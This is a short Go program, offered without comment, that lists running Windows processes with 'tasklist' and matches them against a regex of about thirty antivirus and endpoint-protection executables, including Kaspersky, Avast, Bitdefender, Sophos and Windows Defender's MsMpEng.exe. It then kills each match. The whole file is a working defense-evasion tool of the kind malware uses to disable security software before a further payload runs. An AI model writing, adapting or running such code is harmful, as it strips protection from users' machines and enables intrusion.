package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
)

func main() {
	cmd, err := exec.Command("tasklist").Output()
	if err != nil {
		log.Fatal(err)
	}
	tasklist := string(cmd[:])
	tasksSplit := strings.Split(tasklist, "\n")
	for _, task := range tasksSplit {
		re := regexp.MustCompile(`\s+`)
		taskSplit := re.Split(task, -1)
		if len(taskSplit) > 1 {
			name, pid := taskSplit[0], func() int {
				pid, err := strconv.Atoi(taskSplit[1])
				if err != nil {
					log.Fatal(err)
				}
				return pid
			}
			re := regexp.MustCompile(
				`(?i)avp\.exe|avastsvc\.exe|avgsvc\.exe|mcshield\.exe|nod32krn\.exe|bdagent\.exe|mbamservice\.exe|clamd\.exe|` +
					`sophos\.exe|symantec\.exe|avgui\.exe|windefend\.exe|a2service\.exe|mrt\.exe|f-secure\.exe|forticlient\.exe|` +
					`panda_agent\.exe|vsserv\.exe|MsMpEng\.exe|ashdisp\.exe|avgfwsvc\.exe|bdagent\.exe|mbamservice\.exe|fsdfwd\.exe|` +
					`fortifws\.exe|spnsrvnt\.exe|avc\.exe|bdredline\.exe|fwmain\.exe|hipsdaemon\.exe|smadav\.exe`,
			)

			if re.MatchString(name) {
				process, err := os.FindProcess(pid())
				if err != nil {
					fmt.Printf("Could not get process %v(%v)\n", name, pid())
				} else {
					errKill := process.Kill()
					if errKill != nil {
						fmt.Printf("Error killing process %v(%v): %v\n", name, process.Pid, errKill)
					} else {
						fmt.Printf("Killed process %v(%v)\n", name, process.Pid)
					}
				}
			}
		}
	}
}